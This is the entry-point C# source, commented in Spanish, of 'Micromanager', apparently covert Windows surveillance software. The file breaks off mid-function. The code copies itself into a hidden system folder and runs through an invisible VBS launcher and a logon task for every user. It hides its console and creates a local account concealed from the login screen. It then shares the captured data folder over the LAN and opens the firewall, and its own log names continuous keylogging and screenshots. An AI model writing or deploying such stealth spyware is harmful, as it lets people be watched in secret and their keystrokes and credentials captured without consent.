using Micromanager;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;

// Archivo de log de emergencia
string emergencyLogPath = Path.Combine(Path.GetTempPath(), "micromanager_error.log");

// Manejo global de excepciones
AppDomain.CurrentDomain.UnhandledException += (sender, eventArgs) =>
{
    var ex = (Exception)eventArgs.ExceptionObject;
    string errorMsg = $@"
=====================================
ERROR CRÍTICO - {DateTime.Now}
=====================================
Excepción: {ex.GetType().Name}
Mensaje: {ex.Message}
StackTrace: {ex.StackTrace}
";
    
    try
    {
        File.AppendAllText(emergencyLogPath, errorMsg);
    }
    catch { }
    
    Console.WriteLine("=====================================");
    Console.WriteLine("   ERROR CRÍTICO DETECTADO");
    Console.WriteLine("=====================================");
    Console.WriteLine($"Excepción: {ex.GetType().Name}");
    Console.WriteLine($"Mensaje: {ex.Message}");
    Console.WriteLine($"StackTrace: {ex.StackTrace}");
    Console.WriteLine($"");
    Console.WriteLine($"Log guardado en: {emergencyLogPath}");
    Console.WriteLine("");
    Console.WriteLine("Presione cualquier tecla para salir...");
    try { Console.ReadKey(); } catch { }
};

// Log de inicio
try
{
    File.AppendAllText(emergencyLogPath, $"\n[{DateTime.Now}] Micromanager iniciando...\n");
    File.AppendAllText(emergencyLogPath, $"Usuario: {Environment.UserName}, PC: {Environment.MachineName}\n");
    File.AppendAllText(emergencyLogPath, $"Argumentos: {string.Join(" ", args)}\n");
}
catch { }

try
{
    // Parsear argumentos primero
var argsList = args.ToList();
    bool debugMode = argsList.Contains("--debug");
    
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Argumentos parseados OK\n");
    File.AppendAllText(emergencyLogPath, $"Debug Mode: {debugMode}\n");

    // Mostrar banner solo en modo debug
    if (debugMode)
    {
        Console.WriteLine("=".PadRight(50, '='));
        Console.WriteLine("MICROMANAGER v2.0 - MODO DEBUG");
        Console.WriteLine("=".PadRight(50, '='));
        Console.WriteLine($"Fecha/Hora: {DateTime.Now}");
        Console.WriteLine($"Usuario Windows: {Environment.UserName}");
        Console.WriteLine($"PC: {Environment.MachineName}");
        Console.WriteLine($"Argumentos: {string.Join(" ", args)}");
        Console.WriteLine($"Ejecutando como Admin: {IsAdministrator()}");
        Console.WriteLine($"Ruta actual: {Environment.ProcessPath ?? "UNKNOWN"}");
        Console.WriteLine("");
    }

// Verificar privilegios al inicio si se requiere alguna operación administrativa
bool needsAdmin = argsList.Contains("--shared-folder") || 
                  argsList.Contains("--clean") || 
                  argsList.Contains("--disable");

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Necesita Admin: {needsAdmin}\n");

bool isAdmin = IsAdministrator();
File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Es Administrador: {isAdmin}\n");

if (debugMode) Console.WriteLine($"[DEBUG] Necesita Admin: {needsAdmin}");

// Mostrar advertencia si necesita admin pero no lo es
if (needsAdmin && !isAdmin)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] SALIENDO: No tiene privilegios de admin\n");
    
    Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Se Requiere Admin");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    Console.WriteLine(Configuration.Messages.RequiresAdmin);
    Console.WriteLine("");
    Console.WriteLine("Para usar --shared-folder necesitas:");
    Console.WriteLine("  1. Clic derecho en Micromanager.exe");
    Console.WriteLine("  2. Seleccionar 'Ejecutar como administrador'");
    Console.WriteLine("  3. Volver a ejecutar el comando");
    Console.WriteLine("");
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    Environment.Exit(1);
    return;
}

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Verificación de privilegios OK\n");

if (needsAdmin && IsAdministrator() && debugMode)
{
    Console.WriteLine($"[DEBUG] ✓ Privilegios de administrador confirmados");
}

// Parsear modos de operación
bool stealthMode = argsList.Contains("--stealth");
bool setupMode = argsList.Contains("--setup");
bool disableMode = argsList.Contains("--disable");
bool cleanMode = argsList.Contains("--clean");
bool helpMode = argsList.Contains("--help") || argsList.Contains("-h");

// OCULTAR CONSOLA SI ESTÁ EN MODO STEALTH
if (stealthMode)
{
    HideConsoleWindow();
}
bool sharedFolderMode = argsList.Contains("--shared-folder");
bool reconfigureMode = argsList.Contains("--reconfigure");

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Modos parseados - Clean:{cleanMode}, Disable:{disableMode}, Help:{helpMode}, SharedFolder:{sharedFolderMode}\n");

// VALIDACIÓN: Si ejecuta como SYSTEM, desactivar configuraciones interactivas
// pero PERMITIR la instalación de la tarea programada
bool isSystemAccount = IsSystemAccount();
File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Es cuenta SYSTEM: {isSystemAccount}\n");

// Si es SYSTEM y tiene configuraciones interactivas, desactivarlas pero continuar
if (isSystemAccount && !stealthMode && sharedFolderMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] SYSTEM detectado: Desactivando configuración de carpeta compartida (requiere interacción). Continuando con instalación básica.\n");
    
    // Desactivar modo carpeta compartida porque requiere contraseña interactiva
    sharedFolderMode = false;
    
    if (debugMode)
    {
        Console.WriteLine("=====================================");
        Console.WriteLine("   ADVERTENCIA: Cuenta SYSTEM");
        Console.WriteLine("=====================================");
        Console.WriteLine("");
        Console.WriteLine("Este programa está ejecutándose como NT AUTHORITY\\SYSTEM.");
        Console.WriteLine("");
        Console.WriteLine("⚠ Carpeta compartida DESACTIVADA (requiere contraseña interactiva)");
        Console.WriteLine("✓ La tarea programada se configurará normalmente");
        Console.WriteLine("✓ Se ejecutará automáticamente para TODOS los usuarios del equipo");
        Console.WriteLine("");
        Console.WriteLine("Para configurar carpeta compartida, ejecute manualmente como administrador:");
        Console.WriteLine("  .\\Micromanager.exe --screenshot 60 --cleanup=30 --shared-folder --shared-user \"SoporteManager\"");
        Console.WriteLine("");
    }
}

// Obtener parámetros
string sharedFolderUser = GetStringParameter(argsList, "--shared-user", Configuration.DefaultSharedUser);
int screenshotInterval = GetIntParameter(argsList, "--screenshot-interval", "--screenshot", Configuration.DefaultScreenshotInterval);
int cleanupDays = GetIntParameter(argsList, "--cleanup-days", "--cleanup", Configuration.DefaultCleanupDays);

// Compatibilidad con sintaxis antigua: --stealth 30
if (stealthMode)
{
    int stealthIndex = argsList.IndexOf("--stealth");
    if (!argsList.Any(a => a.StartsWith("--screenshot")) && 
        argsList.Count > stealthIndex + 1 && 
        int.TryParse(argsList[stealthIndex + 1], out int interval1))
    {
        screenshotInterval = interval1;
    }
}

// Manejar modo --help
if (helpMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Mostrando ayuda y saliendo\n");
    ShowHelp();
    Environment.Exit(0);
    return;
}

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] No es modo help\n");

// Manejar modo --clean
if (cleanMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Entrando en modo clean\n");
    
    if (debugMode)
    {
        Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Limpieza Completa");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    Console.WriteLine("⚠️  ADVERTENCIA: Esto eliminará:");
    Console.WriteLine("   • Todas las instancias en ejecución");
    Console.WriteLine("   • Tarea programada");
    Console.WriteLine("   • Carpeta compartida de red");
        Console.WriteLine("   • Usuario de carpeta compartida");
    Console.WriteLine("   • Todos los archivos y datos capturados");
    Console.WriteLine("");
    }
    
    CleanupEverything(sharedFolderUser, debugMode);
    
    if (debugMode)
    {
    Console.WriteLine("");
        Console.WriteLine(Configuration.Messages.CleanupComplete);
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    }
    
    Environment.Exit(0);
    return;
}

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] No es modo clean\n");

// Manejar modo --disable
if (disableMode)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] Entrando en modo disable\n");
    
    if (debugMode)
    {
        Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Desactivar");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    }
    
    DisableAllInstances(debugMode);
    
    if (debugMode)
    {
    Console.WriteLine("");
    Console.WriteLine("✓ Todas las instancias detenidas");
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    }
    
    Environment.Exit(0);
    return;
}

// Auto-instalación si se ejecuta desde otra ubicación O si está en modo reconfiguración
string currentExePath = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? "";
string targetExePath = Path.Combine(Configuration.InstallPath, Configuration.ExeName);

if (debugMode)
{
    Console.WriteLine($"[DEBUG] Ruta actual del ejecutable: {currentExePath}");
    Console.WriteLine($"[DEBUG] Ruta objetivo de instalación: {targetExePath}");
}

bool isFirstTimeInstall = !currentExePath.Equals(targetExePath, StringComparison.OrdinalIgnoreCase) && !setupMode;
bool needsConfiguration = isFirstTimeInstall || (sharedFolderMode && !setupMode) || reconfigureMode;

File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] isFirstTimeInstall: {isFirstTimeInstall}\n");
File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] needsConfiguration: {needsConfiguration}\n");

if (debugMode)
{
    Console.WriteLine($"[DEBUG] Es primera instalación: {isFirstTimeInstall}");
    Console.WriteLine($"[DEBUG] Necesita configuración: {needsConfiguration}");
    Console.WriteLine($"[DEBUG] Modo carpeta compartida: {sharedFolderMode}");
    Console.WriteLine("");
}

if (needsConfiguration)
{
    File.AppendAllText(emergencyLogPath, $"[{DateTime.Now}] ENTRANDO en bloque de configuración\n");
    try
    {
        if (isFirstTimeInstall)
        {
            if (debugMode)
    {
        Console.WriteLine("=== MICROMANAGER - Auto-Configuración ===");
                Console.WriteLine($"Instalando en: {Configuration.InstallPath}");
            }
            
            // Crear directorios
            EnsureDirectoriesExist(debugMode);

            // Copiar ejecutable principal
            if (File.Exists(currentExePath))
            {
                File.Copy(currentExePath, targetExePath, true);
                if (debugMode) Console.WriteLine($"✓ Ejecutable copiado a: {targetExePath}");
            }
            
            // Crear script VBS launcher invisible automáticamente
            // No es necesario que el usuario copie el VBS - se genera automáticamente
            string vbsTarget = Path.Combine(Configuration.InstallPath, "MicromanagerLauncher.vbs");
            CreateVBSLauncher(vbsTarget, debugMode);
        }
        else
        {
            if (debugMode)
            {
                Console.WriteLine("=== MICROMANAGER - Configuración de Carpeta Compartida ===");
                Console.WriteLine($"Instalación detectada en: {Configuration.InstallPath}");
            }
            
            // Asegurar que los directorios existen
            EnsureDirectoriesExist(debugMode);
        }

        // Configurar carpeta compartida solo si se especifica --shared-folder
        if (sharedFolderMode)
        {
            if (debugMode)
            {
                Console.WriteLine($"[DEBUG] Entrando en configuración de carpeta compartida...");
                Console.WriteLine($"[DEBUG] Usuario para carpeta compartida: {sharedFolderUser}");
            }
            
        if (IsAdministrator())
        {
                if (debugMode) Console.WriteLine($"[DEBUG] Privilegios confirmados, pidiendo contraseña...");
                // Pedir contraseña para el usuario de la carpeta compartida
                string password = ConsoleHelper.PromptForPassword(sharedFolderUser);
                if (!string.IsNullOrEmpty(password))
                {
                    // Crear usuario local
                    bool userCreated = UserManager.CreateOrUpdateLocalUser(sharedFolderUser, password, out string userError);
                    if (userCreated)
                    {
                        // Ocultar usuario de la pantalla de inicio de sesión
                        if (UserManager.HideUserFromLoginScreen(sharedFolderUser, out string hideError))
                        {
                            if (debugMode) Console.WriteLine($"  ✓ Usuario '{sharedFolderUser}' oculto de la pantalla de inicio de sesión");
                        }
                        else if (debugMode)
                        {
                            Console.WriteLine($"  ⚠ Advertencia: {hideError}");
        }

        // Configurar carpeta compartida
                        bool shareCreated = NetworkShareManager.CreateShare(
                            Configuration.ShareName, 
                            Configuration.DataPath, 
                            sharedFolderUser, 
                            out string shareError,
                            debugMode);
                            
                        if (shareCreated)
                        {
                            // Configurar firewall para acceso remoto desde la red LAN
                            bool firewallConfigured = FirewallManager.ConfigureFirewallForRemoteAccess(
                                Configuration.ShareName,
                                out string firewallError,
                                debugMode);
                            
                            if (debugMode)
                            {
                                Console.WriteLine($"\n✓ Carpeta compartida configurada para usuario: {sharedFolderUser}");
                                Console.WriteLine($"  Acceso Local: \\\\{Environment.MachineName}\\{Configuration.ShareName}");
                                Console.WriteLine($"  Acceso Remoto: \\\\{GetLocalIPAddress()}\\{Configuration.ShareName}");
                                Console.WriteLine($"  Usuario: {Environment.MachineName}\\{sharedFolderUser}");
                                
                                if (firewallConfigured)
                                {
                                    Console.WriteLine($"  ✓ Acceso remoto desde LAN: HABILITADO");
        }
        else
        {
                                    Console.WriteLine($"  ⚠ Advertencia firewall: {firewallError}");
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine($"⚠ Error configurando carpeta compartida: {shareError}");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"⚠ Error creando usuario: {userError}");
                    }
                }
                else
                {
                    if (debugMode) Console.WriteLine("⚠ Configuración de carpeta compartida cancelada (contraseña no proporcionada)");
                }
            }
            else
            {
                Console.WriteLine(Configuration.Messages.RequiresAdmin);
            }
        }
        else
        {
            if (debugMode) Console.WriteLine("ℹ Carpeta compartida NO configurada (usa --shared-folder para activarla)");
        }
        
        // Excluir carpeta del historial de archivos recientes
        ExcludeFromRecentFiles(debugMode);
        
        // Solo crear/actualizar tarea programada si es instalación nueva
        if (isFirstTimeInstall)
        {
            // Crear tarea programada
            // NOTA: Usa el script VBS launcher que ejecuta el programa de forma invisible
            // wscript.exe ejecuta el VBS sin ventana
            // NO incluir --shared-folder en la tarea programada
            // La carpeta compartida ya se configuró durante la instalación
            string vbsPath = Path.Combine(Configuration.InstallPath, "MicromanagerLauncher.vbs");
            string taskExecutable = "wscript.exe";
            string taskArguments = $"\"{vbsPath}\" --stealth --screenshot-interval {screenshotInterval} --cleanup-days {cleanupDays}";
            
            bool taskCreated = TaskSchedulerManager.CreateOrUpdateTask(
                Configuration.TaskName,
                taskExecutable,  // wscript.exe ejecuta el VBS
                taskArguments,
                out string taskError,
                debugMode);
            
            // SIEMPRE mostrar resultado de creación de tarea (no solo en debug)
            if (taskCreated)
            {
                string confirmMsg = $"\n✓ TAREA PROGRAMADA INSTALADA CORRECTAMENTE\n" +
                                   $"  Nombre: {Configuration.TaskName}\n" +
                                   $"  Se ejecutará automáticamente cuando cualquier usuario inicie sesión\n" +
                                   $"  Ejecutará: {taskExecutable} {taskArguments}\n";
                Console.WriteLine(confirmMsg);
                
                // Log en archivo para confirmar
                string startupLogPath = Path.Combine(Configuration.DataPath, "startup.log");
                File.AppendAllText(startupLogPath, $"[{DateTime.Now}] {confirmMsg}{Environment.NewLine}");
            }
            else
            {
                string errorMsg = $"\n⚠ ERROR: No se pudo crear la tarea programada\n" +
                                 $"  Razón: {taskError}\n" +
                                 $"\n  Puedes crear la tarea manualmente con:\n" +
                                 $"  schtasks /Create /TN \"Micromanager\" /TR \"\\\"{taskExecutable}\\\" {taskArguments}\" /SC ONLOGON /RL HIGHEST /F\n";
                Console.WriteLine(errorMsg);
                
                // Log en archivo
                string startupLogPath = Path.Combine(Configuration.DataPath, "startup.log");
                File.AppendAllText(startupLogPath, $"[{DateTime.Now}] {errorMsg}{Environment.NewLine}");
                
                if (debugMode)
                {
                    Console.WriteLine($"[DEBUG] Detalles del error: {taskError}");
                }
            }
            
            if (debugMode)
            {
        Console.WriteLine("\n=== Instalación Completada ===");
        Console.WriteLine($"Ubicación: {targetExePath}");
                Console.WriteLine($"Datos: {Configuration.DataPath}");
                Console.WriteLine($"Tarea programada: {Configuration.TaskName} (para todos los usuarios)");
        Console.WriteLine("\n🚀 Iniciando servicio de monitoreo...");
        
        // Esperar un momento para que el usuario vea el mensaje
        await Task.Delay(2000);
            }
        
            // Continuar con la ejecución en modo stealth
        stealthMode = true;
        }
        else
        {
            // Solo configuración de carpeta compartida
            if (debugMode)
            {
                Console.WriteLine("\n=== Configuración Completada ===");
                Console.WriteLine($"Carpeta compartida: \\\\{Environment.MachineName}\\{Configuration.ShareName}");
                Console.WriteLine($"Usuario: {Environment.MachineName}\\{sharedFolderUser}");
                Console.WriteLine("\nPresione cualquier tecla para salir...");
                Console.ReadKey();
            }
            Environment.Exit(0);
            return;
        }
    }
    catch (UnauthorizedAccessException ex)
    {
        Console.WriteLine($"\n✗ Error: {Configuration.Messages.RequiresAdmin}");
        Console.WriteLine($"Detalles: {ex.Message}");
        Console.WriteLine("\nPresione cualquier tecla para salir...");
        Console.ReadKey();
        Environment.Exit(1);
        return;
    }
    catch (IOException ex)
    {
        Console.WriteLine($"\n✗ Error de E/S durante la instalación: {ex.Message}");
        Console.WriteLine($"Detalles: {ex.StackTrace}");
        Console.WriteLine("\nPresione cualquier tecla para salir...");
        Console.ReadKey();
        Environment.Exit(1);
        return;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"\n✗ Error inesperado durante la instalación: {ex.Message}");
        Console.WriteLine($"Detalles: {ex.StackTrace}");
        Console.WriteLine("\nPresione cualquier tecla para salir...");
        Console.ReadKey();
        Environment.Exit(1);
        return;
    }
}

// Configurar directorio de logs
EnsureDirectoriesExist();
string logFilePath = Configuration.GetLogFilePath("stealth_log.txt");

// Ejecutar el servicio
if (stealthMode)
{
    try
    {
        // Construir argumentos para el Worker
        var workerArgs = new string[] { 
            "--stealth", 
            $"--screenshot-interval={screenshotInterval}", 
            $"--cleanup-days={cleanupDays}" 
        };
        
        var builder = Host.CreateApplicationBuilder(workerArgs);
        builder.Services.AddHostedService<Worker>();
        var host = builder.Build();

        await File.AppendAllTextAsync(logFilePath, 
            $"[{DateTime.Now}] Running in stealth mode. User: {Environment.UserName}, " +
            $"Machine: {Environment.MachineName}, Screenshot: {screenshotInterval}s, " +
            $"Keylog: CONTINUO, Cleanup: {cleanupDays} days{Environment.NewLine}");

        await host.RunAsync();
    }
    catch (Exception ex)
    {
        await File.AppendAllTextAsync(logFilePath, 
            $"[{DateTime.Now}] Error: {ex.Message}{Environment.NewLine}{ex.StackTrace}{Environment.NewLine}");
    }
}
else
{
    var builder = Host.CreateApplicationBuilder(args);
    builder.Services.AddHostedService<Worker>();
    var host = builder.Build();

    var logger = host.Services.GetRequiredService<ILogger<Program>>();
    logger.LogInformation("Application started in normal mode.");

    await host.RunAsync();
}

// Funciones auxiliares

// API de Windows para ocultar/liberar la ventana de consola
[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern bool FreeConsole();

const int SW_HIDE = 0;

static void HideConsoleWindow()
{
    try
    {
        // MÉTODO 1: Liberar completamente la consola (más profesional, sin flash)
        // Esto desasocia el proceso de la consola completamente
        FreeConsole();
        
        // MÉTODO 2 (alternativo): Solo ocultar la ventana
        // var handle = GetConsoleWindow();
        // if (handle != IntPtr.Zero)
        // {
        //     ShowWindow(handle, SW_HIDE);
        // }
    }
    catch
    {
        // Si falla, intentar el método alternativo de ocultar
        try
        {
            var handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }
        }
        catch
        {
            // Si ambos métodos fallan, continuar sin consola
        }
    }
}

static void CreateVBSLauncher(string vbsPath, bool debugMode = false)
{
    try
    {
        string vbsContent = @"Set objShell = CreateObject(""WScript.Shell"")
Set objFSO = CreateObject(""Scripting.FileSystemObject"")

' Obtener la ruta del script
scriptPath = WScript.ScriptFullName
scriptDir = objFSO.GetParentFolderName(scriptPath)

' Ruta del ejecutable principal
exePath = scriptDir & ""\Micromanager.exe""

' Obtener argumentos pasados al script
args = """"
If WScript.Arguments.Count > 0 Then
    For i = 0 To WScript.Arguments.Count - 1
        args = args & "" "" & WScript.Arguments(i)
    Next
End If

' Ejecutar completamente invisible (0 = ventana oculta, False = no esperar)
' Usamos Chr(34) para las comillas dobles alrededor del path
objShell.Run Chr(34) & exePath & Chr(34) & args, 0, False
";
        
        File.WriteAllText(vbsPath, vbsContent);
        if (debugMode) Console.WriteLine($"✓ Launcher VBS creado en: {vbsPath}");
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"⚠ Error creando VBS: {ex.Message}");
    }
}

static string GetLocalIPAddress()
{
    try
    {
        using (var socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Dgram, 0))
        {
            socket.Connect("8.8.8.8", 65530);
            var endPoint = socket.LocalEndPoint as System.Net.IPEndPoint;
            return endPoint?.Address.ToString() ?? Environment.MachineName;
        }
    }
    catch
    {
        return Environment.MachineName;
    }
}

static void EnsureDirectoriesExist(bool debugMode = false)
{
    try
    {
        if (!Directory.Exists(Configuration.InstallPath))
        {
            Directory.CreateDirectory(Configuration.InstallPath);
            if (debugMode) Console.WriteLine($"✓ Carpeta creada: {Configuration.InstallPath}");
        }
        
        if (!Directory.Exists(Configuration.DataPath))
        {
            Directory.CreateDirectory(Configuration.DataPath);
            if (debugMode) Console.WriteLine($"✓ Carpeta de datos creada: {Configuration.DataPath}");
        }
    }
    catch (UnauthorizedAccessException ex)
    {
        throw new UnauthorizedAccessException($"No se puede crear los directorios necesarios: {ex.Message}", ex);
    }
    catch (IOException ex)
    {
        throw new IOException($"Error de E/S al crear directorios: {ex.Message}", ex);
    }
}

static void ExcludeFromRecentFiles(bool debugMode = false)
{
    try
    {
        if (debugMode) Console.WriteLine("\n--- Configurando Exclusión de Archivos Recientes ---");
        
        // Marcar carpeta principal como oculta y de sistema
        try
        {
            if (Directory.Exists(Configuration.InstallPath))
            {
                DirectoryInfo dir = new DirectoryInfo(Configuration.InstallPath);
                dir.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
                if (debugMode) Console.WriteLine($"✓ Carpeta principal marcada como oculta: {Configuration.InstallPath}");
            }
        }
        catch { /* Ignorar errores */ }
        
        // Marcar carpeta de datos como oculta y de sistema
        try
        {
            if (Directory.Exists(Configuration.DataPath))
            {
                DirectoryInfo dir = new DirectoryInfo(Configuration.DataPath);
                dir.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
                if (debugMode) Console.WriteLine($"✓ Carpeta de datos marcada como oculta: {Configuration.DataPath}");
            }
        }
        catch { /* Ignorar errores */ }
        
        if (debugMode) Console.WriteLine("✓ Archivos de esta carpeta NO aparecerán en 'Archivos Recientes'");
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"⚠ Error configurando exclusión: {ex.Message}");
    }
}

static void DisableAllInstances(bool debugMode = false)
{
    try
    {
        if (debugMode) Console.WriteLine("[1/2] Deteniendo tarea programada...");
        
        if (TaskSchedulerManager.StopTask(Configuration.TaskName, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine("      ✓ Tarea programada detenida");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        if (debugMode) Console.WriteLine("[2/2] Terminando todos los procesos Micromanager...");
        
        var processes = Process.GetProcessesByName("Micromanager");
        int currentPid = Process.GetCurrentProcess().Id;
        int killedCount = 0;
        
        foreach (var process in processes)
        {
            try
            {
                if (process.Id != currentPid)
                {
                    process.Kill();
                    process.WaitForExit(5000);
                    killedCount++;
                }
            }
            catch (Exception ex)
            {
                if (debugMode) Console.WriteLine($"      ⚠ No se pudo terminar proceso {process.Id}: {ex.Message}");
            }
        }
        
        if (debugMode)
        {
        if (killedCount > 0)
        {
            Console.WriteLine($"      ✓ {killedCount} proceso(s) terminado(s)");
        }
        else
        {
            Console.WriteLine("      ○ No se encontraron otras instancias en ejecución");
            }
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }
}

static void CleanupEverything(string username, bool debugMode = false)
{
    try
    {
        // Paso 1: Detener todas las instancias
        if (debugMode) Console.WriteLine("[1/6] Deteniendo todas las instancias...");
        DisableAllInstances(debugMode);
        Thread.Sleep(2000);
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 2: Eliminar tarea programada
        if (debugMode) Console.WriteLine("[2/6] Eliminando tarea programada...");
        
        if (TaskSchedulerManager.DeleteTask(Configuration.TaskName, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine("      ✓ Tarea programada eliminada");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 3: Eliminar carpeta compartida
        if (debugMode) Console.WriteLine("[3/6] Eliminando carpeta compartida...");
        
        if (NetworkShareManager.DeleteShare(Configuration.ShareName, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine("      ✓ Carpeta compartida eliminada");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 4: Eliminar reglas de firewall
        if (debugMode) Console.WriteLine("[4/6] Eliminando reglas de firewall...");
        
        if (FirewallManager.RemoveFirewallRules(Configuration.ShareName, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine("      ✓ Reglas de firewall eliminadas");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 5: Eliminar usuario local
        if (debugMode) Console.WriteLine($"[5/6] Eliminando usuario '{username}'...");
        
        // Restaurar visibilidad del usuario antes de eliminarlo
        UserManager.ShowUserInLoginScreen(username, out string _);
        
        if (UserManager.DeleteLocalUser(username, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine($"      ✓ Usuario '{username}' eliminado");
        }
        else
            {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
                {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
                }

    try
                {
        // Paso 6: Eliminar archivos
        if (debugMode) Console.WriteLine("[6/6] Eliminando archivos y datos...");
        
        if (Directory.Exists(Configuration.InstallPath))
                    {
            DeleteDirectoryWithRetry(Configuration.InstallPath, maxRetries: 3, debugMode);
                    }
                    else
                    {
            if (debugMode) Console.WriteLine("      ○ Directorio no existía");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }
}

static void DeleteDirectoryWithRetry(string path, int maxRetries = 3, bool debugMode = false)
{
    for (int i = 0; i < maxRetries; i++)
    {
        try
        {
            // Quitar atributos de solo lectura, oculto y sistema
            var files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
                            foreach (var file in files)
                            {
                                try
                                {
                                    File.SetAttributes(file, FileAttributes.Normal);
                }
                catch { /* Ignorar errores */ }
            }
            
            Directory.Delete(path, true);
            if (debugMode) Console.WriteLine($"      ✓ Eliminado: {path}");
            return;
        }
        catch (IOException) when (i < maxRetries - 1)
        {
            Thread.Sleep(1000);
        }
        catch (UnauthorizedAccessException ex)
        {
            if (debugMode)
            {
                Console.WriteLine($"      ⚠ Acceso denegado: {ex.Message}");
                Console.WriteLine($"      → Intenta ejecutar como administrador o reinicia el sistema");
            }
            return;
        }
        catch (Exception ex) when (i == maxRetries - 1)
        {
            if (debugMode)
                        {
                            Console.WriteLine($"      ⚠ No se pudieron eliminar algunos archivos: {ex.Message}");
                Console.WriteLine($"      → Intenta reiniciar el sistema y eliminar manualmente: {path}");
            }
        }
    }
}

static int GetIntParameter(List<string> args, string longFlag, string shortFlag, int defaultValue)
{
    // Buscar formato: --flag valor
    int longIndex = args.IndexOf(longFlag);
    if (longIndex >= 0 && longIndex + 1 < args.Count && int.TryParse(args[longIndex + 1], out int longValue))
    {
        return longValue;
    }
    
    // Buscar formato: --flag=valor
    var longWithValue = args.FirstOrDefault(a => a.StartsWith($"{longFlag}="));
    if (longWithValue != null)
    {
        string[] parts = longWithValue.Split('=');
        if (parts.Length == 2 && int.TryParse(parts[1], out int longEqValue))
        {
            return longEqValue;
        }
    }
    
    // Buscar formato corto: --flag valor
    int shortIndex = args.IndexOf(shortFlag);
    if (shortIndex >= 0 && shortIndex + 1 < args.Count && int.TryParse(args[shortIndex + 1], out int shortValue))
    {
        return shortValue;
    }
    
    // Buscar formato corto: --flag=valor
    var shortWithValue = args.FirstOrDefault(a => a.StartsWith($"{shortFlag}="));
    if (shortWithValue != null)
    {
        string[] parts = shortWithValue.Split('=');
        if (parts.Length == 2 && int.TryParse(parts[1], out int shortEqValue))
        {
            return shortEqValue;
        }
    }
    
    return defaultValue;
}

static string GetStringParameter(List<string> args, string flag, string defaultValue)
{
    // Buscar formato: --flag valor
    int flagIndex = args.IndexOf(flag);
    if (flagIndex >= 0 && flagIndex + 1 < args.Count)
    {
        string value = args[flagIndex + 1];
        // Validar que no sea otro flag
        if (!value.StartsWith("--"))
        {
            return value;
        }
    }
    
    // Buscar formato: --flag=valor
    var flagWithValue = args.FirstOrDefault(a => a.StartsWith($"{flag}="));
    if (flagWithValue != null)
    {
        string[] parts = flagWithValue.Split('=', 2);
        if (parts.Length == 2)
        {
            return parts[1];
        }
    }
    
    return defaultValue;
}

static bool IsAdministrator()
{
    try
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch
    {
